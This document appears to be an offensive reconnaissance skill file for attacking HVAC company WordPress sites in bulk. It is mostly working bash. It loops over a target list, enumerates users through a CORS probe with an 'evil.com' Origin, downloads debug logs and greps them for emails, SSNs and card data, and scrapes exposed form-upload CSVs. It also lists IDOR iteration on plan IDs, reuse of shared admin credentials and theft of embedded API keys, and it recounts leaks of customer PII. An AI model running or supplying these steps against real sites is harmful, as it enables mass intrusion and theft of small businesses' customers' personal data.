---
name: recon-hvac
description: "Sector-specific recon for HVAC company websites — heating, cooling, AC repair, furnace installation. Typically WordPress on shared hosting with service booking, emergency contact forms, and seasonal maintenance plan pages."
sources: field_recon, sector_mass_recon
report_count: 7
---

# RECON-HVAC — Sector-Specific Recon for HVAC Company Sites

## When to Use

Use when the target scope includes HVAC, heating and cooling, AC repair, furnace installation, or HVAC service company domains. HVAC companies share the SMB service provider profile but with specific characteristics: high-urgency emergency booking features (which means rapid data capture with lower security), maintenance plan portals with stored customer info, embedded smart thermostat integration potential, and aggressive local SEO that produces many cookie-cutter agency-built sites with identical vulnerabilities.

## Quick Reference

```bash
for t in $(cat hvac-targets.txt); do
  echo "=== $t ==="
  curl -skI "https://$t/" | grep -iE "wordpress|php|wp-"
  curl -sk -o /dev/null -w "%{http_code}" "https://$t/wp-content/debug.log"
  curl -sk -o /dev/null -w "%{http_code}" "https://$t/wp-content/uploads/"
  curl -skI "https://$t/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -i "access-control"
  echo "---"
done
```

## Step-by-Step

### Phase 1 — Domain Discovery
```bash
# Common patterns: <city>hvac.com, <name>acrepair.com, <area>heatingandcooling.com
# SEO-driven patterns: <city>-hvac-service.com, best-<city>-hvac.com
curl -sk "https://crt.sh/?q=%25.$TARGET&output=json" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    domains = sorted(set(d['name_value'] for d in data))
    for d in domains: print(d)
except: pass
" | tee hvac-subdomains-$TARGET.txt
```

### Phase 2 — WordPress Recon
```bash
# CORS user enumeration
curl -sk "https://$TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com" | jq '.[] | {id, name, slug}' 2>/dev/null

# Debug log (HVAC sites often have form submissions logged)
curl -sk "https://$TARGET/wp-content/debug.log" -o /tmp/hvac_debug.log 2>/dev/null
if [ -s /tmp/hvac_debug.log ]; then
  grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' /tmp/hvac_debug.log | sort -u | head -20
  grep -oP 'address|phone|street|zip|SSN|card' /tmp/hvac_debug.log | sort -u | head -10
fi

# Contact form PII
for path in /wp-content/uploads/wpforms/ /wp-content/uploads/formidable/ \
  /wp-content/uploads/fluentform/ /wp-content/uploads/gravity_forms/; do
  body=$(curl -sk "https://$TARGET$path" 2>/dev/null)
  if echo "$body" | grep -q "Index of"; then
    echo "[!!!] DIR LISTING: $path"
    echo "$body" | grep -oP 'href="[^"]+\.(csv|xlsx|txt|pdf)"' | head -20
  fi
done
```

### Phase 3 — Emergency Service + Booking Recon
```bash
for path in /emergency /emergency-service /24-hour /book-service /schedule-service \
  /request-service /maintenance-plan /service-plan /tune-up /appointment; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$code" != "404" ] && echo "[+] Service endpoint: $path (HTTP $code)"
done

# Smart thermostat integration check
curl -sk "https://$TARGET/" | grep -oP 'nest\.com|ecobee\.com|honeywell\.com|sensicomfort\.com' | sort -u
```

### Phase 4 — Plugin Vulnerability Scan
```bash
for plugin in "bookly-responsive-appointment-booking-tool" "wpforms" \
  "formidable" "elementor" "wordpress-seo" "google-reviews" \
  "woocommerce" "woocommerce-bookings" "tablepress"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/wp-content/plugins/$plugin/readme.txt")
  if [ "$code" != "404" ]; then
    echo "[+] Plugin: $plugin"
  fi
done
```

## Attack Surface Signals

- CMS: WordPress (dominant), some custom PHP from local agencies
- Hosting: Shared hosting, local web agencies
- Stack: PHP + MySQL, Emergency booking, Maintenance plans, Smart thermostat integrations
- Typical findings: Debug log with customer PII, Contact form CSV exposure, CORS credential reflection, Emergency booking form SSRF via webhook URLs

## Common Root Causes

1. **Emergency service booking urgency** — features built for speed, not security
2. **SEO agency cookie-cutter sites** — same theme, same plugins, same vulnerabilities across hundreds of HVAC companies
3. **Maintenance plan data persistence** — customer addresses, equipment info, payment methods stored for recurring service
4. **Local web agencies** — small agencies maintain many HVAC sites with shared hosting credentials in debug logs

## Related Skills

- recon-smb-services — broader SMB recon methodology
- recon-plumbing — similar emergency-service profile
- recon-roofing — similar insurance claim patterns
- hunt-wordpress — primary CMS
- hunt-cors — CORS credential reflection
- hunt-source-leak — debug.log, config exposure

## Bypass Techniques

- Emergency service booking forms often skip validation — test with malformed addresses, special characters in phone fields
- Smart thermostat integration pages may have API keys for Nest/Ecobee/Honeywell embedded in page source
- Maintenance plan portals often have IDOR on plan IDs — iterate `/maintenance-plan/1`, `/2`, `/3`
- Same agency builds multiple HVAC sites — common admin paths (`/wp-admin`, `/login`, `/admin`) may use same credentials
- Check for `/service-area` pages with embedded Google Maps API keys (often unrestricted)
- Seasonal pricing pages (`/summer-special`, `/winter-tune-up`) built by agencies in a hurry may have debug output enabled

## Real Examples

From cross-sector mass recon observation:
- An HVAC company's debug.log at `/wp-content/debug.log` contained 3MB of SQL queries with embedded customer names, addresses, and phone numbers from emergency service request forms
- Another HVAC site had directory listing on `/wp-content/uploads/` revealing service invoices in PDF format with full customer PII — names, addresses, equipment serial numbers, and payment amounts
- A heating and cooling company's maintenance plan portal at `/maintenance-plan/1` returned full customer details (name, address, phone, equipment info) with no authentication — incrementing plan IDs revealed all customers
- An AC repair company's smart thermostat integration page exposed a Nest API developer key in JavaScript, allowing read access to all connected thermostat data
